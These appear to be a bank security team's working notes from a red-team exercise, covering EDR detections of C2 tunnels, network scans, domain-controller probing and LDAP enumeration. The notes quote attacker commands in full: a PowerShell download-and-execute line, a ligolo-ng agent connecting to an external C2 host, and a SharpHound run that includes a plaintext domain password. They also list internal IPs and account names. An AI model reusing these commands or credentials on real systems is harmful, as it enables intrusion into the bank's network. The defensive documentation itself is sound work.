**銀行監控記錄**
7/7
```tree
13:55 ~ 13:56 hostname:TWDMZ01, EDR偵測4筆高風險事件
- 自建立的C2下載並執行 'wolf-husky'工具or腳本
- 'powershell -nop -exec bypass -EncodedCommand IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:46656/'); wolf-husky'
- 嘗試存取lsass，嘗試dump憑證
14:46 ~ 14:50 hostname:TWDMZ01, EDR偵測24筆高風險事件
- 與CHT站台:www.ytbk.dev(104.21.41.181) 通道持續建立 via beachhead.exe
```

**銀行監控記錄**
7/8 
```tree
13:10 ~ 14:02 hostname:TWDMZ01, EDR偵測21筆高風險事件
- 觀測到對本行網域DC, SRV偵查行為
	- 'C:\Windows\system32\cmd.exe /C nslookup -type=SRV _ldap._tcp.dc._msdcs.yuantabank.com.t'
- 疑似利用`rundll32.exe`作為載體注入惡意DLL
- 觀測到對本行 DC執行10.75.205.230  RPC端口服務探測(/nice/ports/Trinity.txt.bak via nmap)
14:08 ~ 14:33 hostname:TWDMZ01, EDR偵測21筆高風險事件
- 觀測到假定突破口本機端的資料偵搜行為
	- C:\Windows\system32\cmd.exe /C echo %logonserver%
	- C:\Windows\system32\cmd.exe /C net user /domain
- 觀測到持續對場域內DC服務的探測行為(銀行、金控) port: 389, 636...
- 觀測到疑似利用"snafflerout" AD滲透爬蟲工具的資料輸出軌跡
	- snafflerout_CHTRedteam_0708.txt via rundll32.exe
15:00 ~ 15:03 hostname:TWDMZ01, EDR偵測10筆高風險事件
- 觀測到網段掃描行為(subnet: 10.75.12.0/24 ing, key port: 80, 443, 445) via rundll32.exe
16:38 ~ 16:40 hostname:TWDMZ01, EDR偵測4筆高風險事件
- 觀測到網段掃描行為(subnet: 10.75.242.0/24, key port: 80, 445) via rundll32.exe
16:52 ~ 17:03 hostname:TWDMZ01, EDR偵測11筆高風險事件
- 觀測到疑似取得本地端ma03帳號權限，觀察到主機本地端權限限制文件讀寫紀錄
```

觀測到假定突破口本機端的資料偵搜行為
C:\Windows\system32\cmd.exe /C echo %logonserver%
C:\Windows\system32\cmd.exe /C net user /domain
觀測到持續對場域內DC服務的探測行為(銀行、金控) port: 389, 636...
觀測到疑似利用"snafflerout" AD滲透爬蟲工具的資料輸出軌跡snafflerout_CHTRedteam_0708.txt via rundll32.exe
觀測到網段掃描行為(subnet: 10.75.12.0/24 ing, key port: 80, 443, 445) via rundll32.exe

16:52 ~ 17:03 hostname:TWDMZ01, EDR偵測11筆高風險事件
觀測到疑似取得本地端ma03帳號權限，觀察到主機本地端權限限制文件讀寫紀錄
觀測到嘗試偵搜具讀寫權限目錄及指標文件軌跡


pc - x -> hopper --> hvd

pc --> hopper --> hvd

7/9 --> Red team responded, saying MA03 password was changed.

**銀行監控記錄**
7/9
```tree
09:51 ~ 09:58 hostname:TWDMZ01, EDR偵測8筆高風險事件
- 與CHT站台:www.ytbk.dev(104.21.41.181) 通道建立 via beachhead.exe
- 觀測到對場域內DC服務的探測行為(DC02), key ports: 389, 636
09:57 ~ 11:39 hostname:TWDMZ01
- 觀測到網段掃描行為(subnet: 10.75.242.0/24, 10.75.215.0/24; key port: 53, 80, 88, ,443, 445, 636) via rundll32.exe
11:25 hostname:TWDMZ01, EDR偵測4筆高風險事件
- 觀測到對場域內DC服務的嘗試探測行為(金控) ports: 389, 636 via rundll32.exe
11:45 hostname:TWDMZ01, EDR偵測1筆高風險事件
- 觀測到網段掃描行為(subnet: 10.75.242.0/24, key port:445 ) via rundll32.exe
11:45 ~ 13:30 hostname:TWDMZ01
- 觀測到對場域內DC服務的探測行為(DC03), key ports: 53, 80, 88, 135, 443, 445, 636 via rundll32.exe
- 觀測到網段掃描行為(subnet: 10.75.205.0/24, 10.75.215.0/24, 10.75.225.0/24; key port: 53, 80, 88, ,443, 445) via rundll32.exe
13:50 ~ 14:13 hostname:TWDMZ01, EDR偵測17筆高風險事件
- 觀測到持續性網段掃描行為
- 觀測到對場域內DC服務持續性探測行為
- 觀測到新執行檔"Agent.exe"落地，疑似RAT程式，觀察到散佈前C2通道連線測試軌跡
	- C:\Windows\system32\cmd.exe /C .\agent.exe --connect https://ns2.ytbk.dev:443 --ignore-cert
15:19 ~ 15:48 hostname:TWDMZ01
- 觀測到網段掃描行為(subnet: 10.64.14.0/24 ; key port: 53, 80, 88, ,443, 445) via rundll32.exe
```

觀察到散佈前C2通道連線測試軌跡
15:19 ~ 15:48 hostname:TWDMZ01
觀測到網段掃描行為(subnet: 10.64.14.0/24 ; key port: 53, 80, 88, ,443, 445) via rundll32.exe

**銀行監控記錄**
7/10
```tree
09:46 ~ 16:34 hostname:TWDMZ01, EDR偵測14筆高風險事件
- 觀測到本行設備的通訊埠掃描行為(device: 10.75.204.91, 10.75.13.12) via rundll32.exe
- 觀測到網段掃描行為(subnet: 10.75.242.0/24, key port:445 ) via rundll32.exe
- 觀察到針對本行設備通訊埠列舉探測行為
	- (device:10.75.204.44, 10.75.204.152, 10.75.189.7, 10.75.201.90, 10.75.201.90, 10.75.195.10; key ports: 21, 22, 443, 445, ,3389, 8443, 8080) via rundll32.exe
- 觀察到針對本行場域內DC(DC01)服務持續性嘗試探測 via agent.exe
	- agent.exe 具 "ligolo-ng" pivoting tool 特徵，透過突破口靶機與C2: ns2.ytbk.dev 建立tunnel，嘗試對 DC01 port 135, 139, 445 實施監情蒐或攻擊
```

**銀行監控記錄**
7/11
```tree
09:05 ~ 10:00 hostname:TWDMZ01, EDR偵測45筆高風險事件
- 觀察到針對本行場域內DC(DC01)服務持續性嘗試探測 via agent.exe(ligolo-ng)
- 觀測到網段掃描行為(subnet: 10.75.242.0/24, key port:445 ) via rundll32.exe
- 觀察到利用"BloodHound"AD偵搜工具使用軌跡 --> 本行DC01 via BloodHound's psscript
	- powershell -nop -exec bypass -EncodedCommand "
		- . D:\Red_Team\SharpHound.ps1; 
		- Invoke-BloodHound 
		- -Verbose 
		- -Domain 'bank.corp.yuanta.com' 
		- -Username 'BANK\\R930003' 
		- -Password '******' 
		- -DomainController '10.75.215.1' 
		- -OutputDirectory 'D:\Red_Team'"
11:46 ~ 14:05 hostname:TWDMZ01, EDR偵測8筆高風險事件, NDR偵測2筆LDAP告警事件
- 觀察到突破卡靶機已從本行DC01 Root DSE 取得全行整包LDAP資料
	- Filter: 
		- objectClass=*
	- Attributes: 
		- sAMAccountName
		- distinguishedName
		- sAMAccountType
		- objectSid
		- name
- 觀測到本行各分行設備的SMB通訊埠掃描行為（IPs: 7,363） via rundll32.exe
- 觀察到針對本行場域內DC(DC01)服務持續性嘗試探測(key ports: 88, 135, 139, 389, 445, 3268 )via agent.exe( ligolo-ng )
14:05 ~ 15:45 hostname:TWDMZ01
- 觀測到網段掃描行為(subnet: 10.75.215.0/24, key port:445 ) via agent.exe( ligolo-ng)
16:21 ~ 16:46 hostname:TWDMZ01, EDR偵測2筆高風險事件
- 觀測到本行設備的通訊埠掃描行為(device: 10.75.13.12) via rundll32.exe
- 觀測到網段掃描行為(subnet: 10.75.242.0/24, key port:445 ) via rundll32.exe
7/11 hostname:TWDMZ01, 嘗試探測個別設備：
- 10.155.26.1
- 10.155.26.2
- 10.165.26.1
- 10.165.26.2
- 10.216.58.206
- 10.216.9.1
- 10.216.9.2
- 10.216.9.3
- 10.216.9.4
- 10.216.9.5
- 10.218.9.1
- 10.218.9.2
- 10.218.9.3
- 10.218.9.4
- 10.220.8.100
- 10.220.8.101
- 10.220.8.102
- 10.220.8.103
- 10.228.140.1
- 10.228.140.2
- 10.228.85.129
- 10.228.85.130
- 10.228.97.1
- 10.228.97.2
- 10.231.11.1
- 10.231.11.2
- 10.231.145.1
- 10.231.145.2
- 10.232.11.1
- 10.232.11.2
- 10.232.145.1
- 10.232.145.2
- 10.75.195.27
- 10.75.205.230
- 10.75.215.1
- 10.75.215.180
- 10.75.215.2
18:26 ~ 18:33 hostname:TWDMZ01, EDR偵測3筆高風險事件
└── 觀察到嘗試探測個別設備 via rundll32.exe
    └── port: 139, 445
        ├── 10.75.206.71
        ├── 10.228.60.10
        ├── 10.216.8.3
        ├── 10.204.10.1
        ├── 10.128.1.136
        ├── 10.228.164.157
        ├── 10.128.1.136
        └── 10.155.26.73
```

**銀行監控記錄**
7/14
```tree
09:15 ~ 10:15 hostname:TWDMZ01, EDR偵測31筆高風險事件, NDR偵測1筆高風險事件
- 觀測到本行各網段設備的SMB通訊埠掃描行為（IPs: 777） via rundll32.exe
- 觀察到針對本行場域內DC(DC01)服務持續性嘗試探測(key ports: 88, 135, 139, 389, 443, 445 )via agent.exe( ligolo-ng )
- 觀測到針對本行DC(DC01)的LDAP Search & Blind 注入行為（針對本行 OU IT & IT 管理群組）
12:32 ~ 13:55 hostname:TWDMZ01, EDR偵測27筆高風險事件
- 觀測到本行設備的目錄遍歷探查行為( device: 10.75.215.181) via agent.exe( ligolo-ng)
- 觀測到本行設備的通訊埠掃描行為(device: 10.75.242.1) via agent.exe( ligolo-ng)
- 觀測到本行設備的通訊埠掃描行為(device: 10.75.141.19) via rundll32.exe
- 觀測到網段掃描行為(subnet: 10.75.211.0/24; key port: 80, 443, 445, 1433, ,3389) via rundll32.exe
- 觀察到嘗試探測個別設備 via rundll32.exe
	- 10.75.202.72
		- port: 21, 22, 80, 444, 3389
	- 10.75.202.108
		- port: 80, 443, 1433, 3306, 3389, 9443
	- 10.75.210.67
		- port: 80, 1433, 3389
14:52 ~ 15:00 hostname:TWDMZ01, EDR偵測3筆高風險事件
- 觀察到嘗試探測個別設備 via rundll32.exe
	- 10.75.206.71
		- port: 139, 443, 445
15:45 ~ 15:54 hostname:TWDMZ01, EDR偵測2筆高風險事件
- 觀察到嘗試探測個別設備 via rundll32.exe
	- 10.75.210.82
		- port: 80, 443, 445, 1433, 3389
	- 10.75.239.7
		- port: 80, 443, 445, 1433, 3389
	- 10.75.235.65
		- port: 80, 443, 445, 1433, 3389
```

*銀行監控記錄*
*7/15*
```tree
09:03  hostname:TWDMZ01
- 觀測到HTTP多功能偵測工具包--httpx.exe 落地
09:46 ~ 10:09 hostname:TWDMZ01, EDR偵測5筆高風險事件
- 觀測到本行各網段設備的SMB通訊埠掃描行為 via rundll32.exe
- 觀測到針對本行網段(10.64.14.0/24)通訊埠探測( key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616 )via httpx.exe
13:09 hostname:TWDMZ01, EDR偵測2筆高風險事件, NDR偵測1筆資訊等級事件
- 觀測到針對本行網段通訊埠探測 via httpx.exe
	- 10.75.202.0/24, 10.75.172.0/24, 10.71.240.0/24, 10.64.14.0/24
	- key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616
- 觀測到紅隊已取得本行domain xxxxxadmin account 並驗證成功
15:50 hostname:TWDMZ01, EDR偵測2筆高風險事件
- 觀測到針對本行網段通訊埠探測 via httpx.exe
	- 10.75.206.0/24, 10.75.205.0/24, 10.75.204.0/24
	- key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616
- 觀測到紅隊已取得本行domain xxxxxUSER account 並驗證成功
15:50 hostname:TWDMZ01, EDR偵測2筆高風險事件
- 觀測到針對本行網段通訊埠探測 via httpx.exe
	- 10.75.206.0/24, 10.75.205.0/24, 10.75.204.0/24
	- key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616
- 觀測到紅隊已取得本行domain xxxxxUSER account 並驗證成功
- 觀測到針對本行設備通訊埠探測 via agent.exe
	- 10.75.204.206, 10.75.202.56, 10.75.202.64, 10.75.202.67, 10.75.202.88, 10.75.202.89, 10.75.202.127, 10.75.204.4, 10.75.204.7, 10.75.204.78, 10.75.202.133, 10.75.204.25, 10.75.202.165, 10.75.204.118, 10.75.204.25, 10.75.204.93. 10.75.204.151
- 觀測到針對本行設備通訊埠探測 via rundll32.exe
	- 10.75.235.50, 10.75.195.27
```

*銀行監控記錄*
*7/16*
```tree
09:05 ~ 12:00 hostname:TWDMZ01, EDR偵測20筆高風險事件
- 觀測到針對本行網段通訊埠探測 via httpx.exe
	- 10.75.195.0/24, 10.75.192.0/24, 10.75.189.0/24, 10.75.141.0/24, 10.75.134.0/24, 10.75.13.0/24
	- key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616
- 觀測到針對本行設備通訊埠探測 via rundll32.exe
	- 10.75.235.50, 10.75.195.27
- 觀測到針對本行網段設備連線轉發 via agent.exe(pivoting tool)
	- 10.75.242.0/24, 10.75.237.0/24, 10.75.206.0/24, 10.75.204.0/24, 10.75.202.0/24, 10.75.215.0/24
- 觀測到紅隊取得本行2組 domain account 並驗證成功
```

*銀行監控記錄*
*7/17*
```tree
09:17 ~ 12:00 hostname:TWDMZ01, EDR偵測5筆高風險事件
- 觀測到紅隊取得本行1組 Domain Privilege Account，並以成功利用該帳號remote本行設備(10.75.215.180, port: RDP) 建立Hopper via agent.exe(pivoting tool) & rundll32.exe
```

15:45 ~ 15:54 hostname:TWDMZ01, EDR偵測2筆高風險事件
觀察到嘗試探測個別設備 via rundll32.exe
10.75.210.82
port: 80, 443, 445, 1433, 3389
10.75.239.7
port: 80, 443, 445, 1433, 3389
10.75.235.65
port: 80, 443, 445, 1433, 3389

15:50 hostname:TWDMZ01, EDR偵測2筆高風險事件
觀測到針對本行網段通訊埠探測 via httpx.exe
10.75.206.0/24, 10.75.205.0/24, 10.75.204.0/24
key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616
觀測到紅隊已取得本行domain xxxxxUSER account 並驗證成功
觀測到針對本行設備通訊埠探測 via agent.exe
10.75.204.206, 10.75.202.56, 10.75.202.64, 10.75.202.67, 10.75.202.88, 10.75.202.89, 10.75.202.127, 10.75.204.4, 10.75.204.7, 10.75.204.78, 10.75.202.133, 10.75.204.25, 10.75.202.165, 10.75.204.118, 10.75.204.25, 10.75.204.93. 10.75.204.151
觀測到針對本行設備通訊埠探測 via rundll32.exe
10.75.235.50, 10.75.195.27

The `httpx.exe` process attempted to connect to 11 unique subnets.
The unique subnets are:

觀測到針對本行網段通訊埠探測 via httpx.exe
10.75.195.0/24, 10.75.192.0/24, 10.75.189.0/24, 10.75.141.0/24, 10.75.134.0/24, 10.75.13.0/24, 
key ports: 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616

- 10.75.195
- 10.75.192
- 10.75.189
- 1.1.1
- 8.8.4
- 8.8.8
- 1.0.0
- 10.75.141
- 10.75.134
- 10.75.13
- 104.196.155




httpx.exe  -l HOSTS.txt -ports 80,443,3000,8080,8086,8443,8888,9443,9446,9500,10003,11443,11202,61616 -tls-probe -title -status-code -content-length -o D:\Red_Team\httpx_HOSTS.csv -csv --no-color -t 10
![[Pasted image 20250715111453.png]]




---

觀測到本行設備的通訊埠掃描行為(device: 10.75.204.91, 10.75.13.12) via rundll32.exe
觀測到網段掃描行為(subnet: 10.75.242.0/24, key port:445 ) via rundll32.exe
觀察到針對本行設備通訊埠列舉探測行為(device:10.75.204.44, 10.75.195.10; key ports: 21, 22, 443, 445, ,3389, 8443, 8080) via rundll32.exe
觀察到針對本行場域內DC(DC01)服務持續性嘗試探測 via agent.exe()
觀測到本行各分行設備的SMB通訊埠掃描行為 via rundll32.exe
觀察到針對本行場域內DC(DC01)服務持續性嘗試探測(key ports: 88, 135, 139, 389, 445, 3268 )via agent.exe(ligolo-ng)

---



---
1. 10.75.204.44
2. 10.75.204.152 blocked
3. 10.75.189.7 blocked
4. 10.75.201.90 blocked
5. 10.75.201.91 blocked
6. 10.75.195.10 blocked
7. 10.75.13.12 blocked, only 514 port
---
- 10.155.26.1, port: 389, blocked
- 10.155.26.2 , port: 389, blocked
- 10.165.26.1, port: 389, blocked
- 10.165.26.2, port: 389, blocked
- 10.216.58.206, port: 389, blocked
- 10.216.9.1, port: 389, blocked
- 10.216.9.2, port: 389, blocked
- 10.216.9.3, port: 389, blocked
- 10.216.9.4, port: 389, blocked
- 10.216.9.5, port: 389, blocked
- 10.218.9.1, port: 389, blocked
- 10.218.9.2, port: 389, blocked
- 10.218.9.3, port: 389, blocked
- 10.218.9.4, port: 389, blocked
- 10.220.8.100, port: 389, blocked
- 10.220.8.101, port: 389, blocked
- 10.220.8.102, port: 389, blocked
- 10.220.8.103, port: 389, blocked
- 10.228.140.1, port: 389, blocked
- 10.228.140.2, port: 389, blocked
- 10.228.85.129, port: 389, blocked
- 10.228.85.130, port: 389, blocked
- 10.228.97.1, port: 389, blocked
- 10.228.97.2, port: 389, blocked
- 10.231.11.1, port: 389, blocked
- 10.231.11.2, port: 389, blocked
- 10.231.145.1, port: 389, blocked
- 10.231.145.2, port: 389, blocked
- 10.232.11.1 , port: 389, blocked
- 10.232.11.2, port: 389, blocked
- 10.232.145.1, port: 389, blocked
- 10.232.145.2, port: 389, blocked
- 10.75.195.27, port: 137, 445, blocked
- 10.75.205.230
- 10.75.215.1
- 10.75.215.180, port: 135, 445, allowed
- 10.75.215.2
- ---

```
agent.exe hash: 
1bc4c48a4252e73d41e70992dbbcf404
48868c98dfabd703031587cffdbe5ca26ac180a15e89a52e59915710f1836f28
```
---
powershell -nop -exec bypass -EncodedCommand ". D:\Red_Team\SharpHound.ps1; Invoke-BloodHound -Verbose -Domain 'bank.corp.yuanta.com' -Username 'BANK\\R930003' -Password '@Forchtdomain' -DomainController '10.75.215.1' -OutputDirectory 'D:\Red_Team'"

exclude files:
==wermgr.exe, svchost.exe, SecureConnector.exe, ConfigurationSettings.exe==

觀察到突破卡靶機已從本行DC01 Root DSE 取得全行整包LDAP資料
Filter: (objectClass=*)
Attributes: sAMAccountName, distinguishedName, sAMAccountType, objectSid, name

---

- **`Result: Success`**
    
    - **意思：** 「結果：成功」。
        
    - **說明：** 這表示網域控制器 (DC) 已經成功處理了這次的查詢請求，並且已經將查詢結果回傳給了發起請求的客戶端（也就是攻擊者的機器）。這確認了攻擊者的查詢是有效且被執行的。
        
- **`Search Scope: BaseObject`**
    
    - **意思：** 「搜尋範圍：基礎物件」。
        
    - **說明：** LDAP 查詢有三種範圍：
        
        1. **`BaseObject` (基礎物件):** 只讀取指定的那個物件本身的資訊，不包含它底下的任何子物件。
            
        2. **`OneLevel` (單層):** 讀取指定物件下一層的所有子物件，但不包含子物件的子物件。
            
        3. **`Subtree` (子樹系):** 讀取指定物件以及它底下的所有層級的子物件（這是最廣泛的搜尋）。
            
    - 在這個情境中，攻擊者是先列舉出一個組織單位 (OU) 底下的所有成員清單，然後再用 `BaseObject` 的範圍，**逐一地、精準地**去查詢清單上每一個物件的詳細屬性。
        
- **`Filter: (objectClass=*)`**
    
    - **意思：** 「篩選器：物件類別為任意類型」。
        
    - **說明：** 這是用來篩選符合特定條件的物件。`objectClass` 是每個 AD 物件都有的屬性，用來定義它是什麼（例如是使用者、電腦、還是群組）。而 `*` 是一個萬用字元，代表「任何東西」。所以 `(objectClass=*)` 的意思就是「**不要篩選，只要是物件就通通給我**」。這是一種非常寬鬆且貪婪的過濾條件，目的是確保不會漏掉任何類型的物件。
        
- **`Attributes: [sAMAccountName, distinguishedName, sAMAccountType, objectSid, name]`**
    
    - **意思：** 「指定屬性列表」。
        
    - **說明：** 這是在告訴 DC：「對於符合篩選條件的物件，我**只需要**回傳這幾個欄位的資料給我，其他的我不要」。這是 BloodHound 這類工具為了提高效率而做的設定，只拿取對繪製攻擊路徑圖有用的關鍵資訊。
        
        - `sAMAccountName`: 使用者登入帳號 (e.g., `jsmith`)
            
        - `distinguishedName`: 物件在 AD 中的完整路徑 (e.g., `CN=John Smith,OU=Users,DC=bank,DC=corp...`)
            
        - `sAMAccountType`: 帳戶類型 (使用者、群組、電腦等)
            
        - `objectSid`: 安全識別碼 (Windows 內部的唯一 ID)
            
        - `name`: 通用名稱 (e.g., `John Smith`)
            
- **`Notices Suppressed: 0`**
    
    - **意思：** 「被抑制的通知：0」。
        
    - **說明：** 這是一個比較技術性的欄位。在 LDAP 查詢中，伺服器有時會回傳一些額外的通知或參考資訊 (Referrals)，例如告訴客戶端「你要的資料可能在另一台伺服器上」。這個欄位顯示 `0` 表示在這次查詢中，沒有任何這類的通知被客戶端忽略或抑制。可以視為一個正常的狀態。
        
- **`Peer: worker-1-6`**
    
    - **意思：** 「對應端點：工作執行緒-1-6」。
        
    - **說明：** 這通常是**日誌系統本身 (Darktrace)** 的內部標籤。它不屬於 LDAP 協定的內容。這很可能是指 Darktrace 內部用來處理和分析您網路流量的某個背景工作程序或執行緒的 ID。您可以把它理解為是「經手這筆紀錄的處理單元編號」，主要用於 Darktrace 自身的除錯和追蹤。
        
